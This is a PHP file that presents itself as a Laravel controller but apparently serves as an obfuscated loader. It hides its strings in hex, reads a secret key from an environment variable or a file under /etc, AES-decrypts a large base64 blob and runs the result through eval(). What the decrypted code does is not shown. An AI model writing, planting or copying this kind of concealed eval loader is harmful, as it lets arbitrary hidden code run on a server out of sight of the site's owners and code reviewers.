<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hDJaJTbavNtbBrNkCNu3hg==');

$c=base64_decode(

'utZ/V4/v/25oMgDCXPE0t967hpmGuFadwFpzlSirwVQYOTxPjneUmyndc6s6N3UGxl0idb98w3s/' .
'YQ2lu9xWYoGlIqeuNv7fH/eZskkRmSySnXUXOaxm0N5s8Xf/SCY5EKhA6ahwWoBUm3IDu5TBXuks' .
'GceIqk+gQcK9QhyaRT4ECpOmGqqe/6OwdkQH9whdzlNThCmLurGSAxXoS6jaZh4i1bUyOqPGK1Xj' .
'hb/B+2B9r3DZc0prdtV8rlmt/nqLMR3rP5LvEFllYZWcdleh5vCcA8Itefz9JIZjZsjDV51svBo+' .
'0erTO4TxdiK7y5DXxyDMNgJL4sn/6A6xAxLWyGy6yi11KjN6veq89cAFCXO4rA9ZaSTuVpfuOzjc' .
'8WFk9vFv9E0Vhr5IrRmNGATh1snWKbmhoZrDzQOGytcaEK/jPJUWv+EQmlsIICwUP5WIkMl+Gsui' .
'cOKxw6lSgL6CJi/WeQfT7MDlHbbbKtQdZaZ1enR+mRxP1YYfh6q+gbuhqXnadZ9CGUELf4qtudBT' .
'yc2BJBP7CouR5Zq0Uad+Cy7S4nHwHJAbvvJ8lfg0uzMZ8BJxXNk8YjlzGEeQwU5xkWSI+L7uxhSn' .
'3zQls9McnZaXZiHLR7iIX608hLVwfhTdCZx8OoYMCnxPtJGVPFtnoDb75mUBWBxDKb7gSZLwZYDS' .
'NEkWc2AR7TfqNIBjT721W84zgBSE1HJ2xEgFbtj5EmTTSBZbMoIhZKwfwinfIkeXsLDjo/DWUMTh' .
'3ur0SHPdbG8OhYWIRccnF3wpX91sEEB+JnmjBWvfKP+BnG3XzGah8VDpKwNhRvBkAoNXh4bNBwqz' .
'mlwLP6iR9L7ZB1hRmSM4yl9gBctC3rpyPXRdcYdwwLkR8c9McqHsq3wr3wxvVt0jnKflTmx2DC/H' .
'1VB9FK1wRWHd1fj/k0vZeKP7hwndsxXawySNlMwu4lRv6uCr0tjyb104ZLh02cc8DOWNHczkLHI5' .
'YhZuNwl4V/jmTxBo/45fsW3rG+j3ByJ/a+Jqer/litcWZovGXWEVl+jiAHcys6JOiozWa4xXa7CY' .
'NHJtNxkBKx66gdvJYg38rEF79E8DZbYFN6xGFSwqxhuAz5AhbkdR1EtGvQG+Mpb7Y7T/2yYyoe4q' .
'UtXQBEqmB4phv9ThPym216KN6B18VFk3IWQIUxqw05qxjmq7LiVfrX/TfwudPUgdV+18+FBw+NIt' .
'rDv19EXI5jbQhOQW4nqzf/8fJ/jEWhW/jpfV2B4oRkF6PjWO7YQHd/v+3v3I+i/7r0xtbejWHcz8' .
'jxQO7Wbj4Ojd/NU71m2NoD4xnu2dYmcAA69k+Wz0/WICPEvzloWSf/9vAH2tCEOBQKK9sECYgu6l' .
'1Hx5IuySwX2Wslc0heEmtNduDSayI7zF5+3qLEDlWVl4NuJyO27cX3msBS3a1O/JbFLk68LfB56D' .
'TmPAoUhXsqaetqz+d29tPtOandW4FPBmFHeha5c+YogodYdryoXwiHwcxZhTfExrnIyocOBz1a5k' .
'+O+rfxtDq4lVLDmp0u8GR8tmfjea1aOhAcc1iCWz4yGhWN5CgOEkji7pJ1ALTCMMykEVV4y8JjRp' .
'3FLnh1ZSBUJBMz18p7a3TXCtV/NOLycb+SAlIUI4jxxgQCknioN8+mvVD07WzDbPOfzsC8wP3e9d' .
'qWfXZqIC63luti61MyuLoa2BWaFA2PAM5uTo/EXJGKRlkic9/RJlRPwAys06KPRUaRA9yDSdLD9n' .
'Tql29plgCzjvygbDgMk6VmFKSfJu1O6G74NyZr0QgM9M+TiEiP6rj+D8Rg50D1dCuNG5NcezoJHH' .
'svBFcE8eF7/Eha+XlSZ/MYP8sy+iWLtkzgnBQ0xBP8zhR/yurNjsDmWex5Vp3CkyIs6IG6/vCdBt' .
'F9y3h5D4UUH1D18tGge1EG8/8pRB7orczV3bLb1D5HHf+TcbKMYLdwKMoXbjVHT3GVtg5eDdk7nx' .
'DnvDMSmJTdT0J9YRJsDdxaSEgdIPvGlAhVS+KybCV4V3GbmAn0OK7zEVL06CODHWUzGYmrJgEaQe' .
'F2Io5LzCiKmCIm2Ufi/I++w+DqzzqGfn1ge5/By8mFQxtMC3SOMkwk9mX6Fy6soJWFfqalczb3zM' .
'yzyYkkzXRMu3kmtil85mmeksK2gr629CRsyLWc0wHLS7C5aa+F+U3SlUfZL0lw06LeyY5SoOzfp/' .
'Q+Q/GVu35ya0QjIJp3k4Adw6HdO63X32akPBtscEdpfg9f/B23El3A1zfcfqtZjFdy7wN9j8JKT2' .
'zXZNratESYt9kW12iukQ4th2YOk/fJpSA1Y+9fnigOS6vJlbaHNwdJtK47BqU13D2cXIUOWXUhyN' .
'3FnhMQrEbsHcRShut4ezTfGxMyrXzrX8Mquxk+bIH5CPkSSILVcmpdW41mdmR0qk/PTNYr2XxrmY' .
'rDc5+yzdU5Z7ei3yFCVS0GkkShqVxHmEYhTI2SDJ/rtL0fzBgXVu8EGzBiUdCFYZhCttPUIUgJJH' .
'5hyK9AMzyYfrmIsbnwuo2cTAKZk5XwsPvM5l/eGlyzd4MJnREIZmyH73wUySHmDTlaTBiTwapaUs' .
'KBLvv8lcFCH9G13yNAlIDE/SiXNXb3gZ2dqTtkcdcnAB+lZZ4TI4aUHR+DD8AB1rGXbxfJgruVo0' .
'fkUO0HthrbQjo3gYQjnHZeua92A0jRrWGpl7tA3jar5FxJIS4/MrxoUILfaPaQztJj3AmBOBIJkS' .
'+nxUo7tMwS2Qqjo4MKDRlHI1nwPzj04Lz3GADfnjpX4oBgs+Di0MtuktocDum6MTj6GYDY5kBTG8' .
'zEAkYJekDPTaC4hrqr+5NQRp083Gyyj4M7qR/LWGdRrN91QABTVn7S8hX+sJ2cGfevgNgYUpL2b9' .
'mfYjw9gst2l7qoHswx36HO4nNRqJpmSFvnld6bSChWVP28bsGK4KAOcXc7yPOge0433vSQcuFe6n' .
'hVIsEwv8o0f3w6EnInl8m2X6PvjWFT0d+ctmOgdHaUm1KL1WeDM/yFk+Vr92usKvZ/aVHUJkQ54j' .
'4icEeIRsSAbsIPpu3KI1eHp5gyvWnL6bDpoUouLPuCnpMBVEFKlrqeoaqRwjKoCrnH1sZyhvYIHs' .
'RQ5q4dLzoyUBMMrUFFV1+nA+bbrf3Q2iIb7a9vw9hME7Y+JxjzdSAfa/yVLnSfa219mo74Rp1/nf' .
'2XAayH/NEh1qTTxsme1Uf1a73/E5PCmdtEHOVuhvjUE8M74T7PYcYawkncOvJo//aC5DOFG8BASJ' .
'egjjvMdWIvLYKgAEo9tcR4kRK6tmGBb57ro+YJNuqkXPg4P9xkcDUai+KSXdfiF8HyX9m9tHdwDC' .
'uhj/oJ2SEXIvH1yu0qbyN3yKuP2bMqycKyi1x9rR/9Yja2gsgDfJUFo8E0pKfi6B6rErZbXURRCF' .
'Rd2DG099pKMtLmhbc/rQ35yDBxwOjoz5GhyY5e4YAaoU6EF5aMuy+KBLbI5NjIVG5ndS7gWRJ77K' .
'IBFn44WmhFnyak+BZ7/0voY4AQEIvmqpF1tWHzNg01eIoeOpK0TBeIYsWmGtSfDqbQ0o4ssSNuvs' .
'on7PMMqLRdW3yehxbToAN3gWKkzR25HtIKEs5goeVKNVNdPZR5y4mnht6EuwURGjGP+shepfPqlY' .
'zgB2b4BI1ZiY0qfN5BkOa2XPLPB1tYP2QpJZaVOejBm5wDK/+xhdKD0psXLhBhDOnMq8qUzR/iVU' .
'0oQDfBjNC4KMgdhBeamrh4dDBTrDlL+L8o0pWu6VlVKWRG0hV/DFEFwDf6qYoEnAHJ+iCK5HPGqy' .
'URreuPS6gUfxnixW0EXGyDHZr5i2xEyaTCwXMMkiqgyQA7JxgINsgxx2LNgxt2Jm8cKkNtHbnHOH' .
'kKVCtf7QhY3I7ZX/yXbZfecB7gvbNNp6GISurYFPqo/q+hnfRe59Yg0s/Q4bndiT2ph2oF4yvXju' .
'qSWFANxXf7TISrgWH3ysuWYg6j4iI5zo9b3G2PKOt9Od4VyXJWhKJk9E4ILz81FdYLCYQ8qMHFB2' .
'4MJwyhnTVgmsqqYyeFsP/IMPk6lerzDYglhNQzRciFdjbFM='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

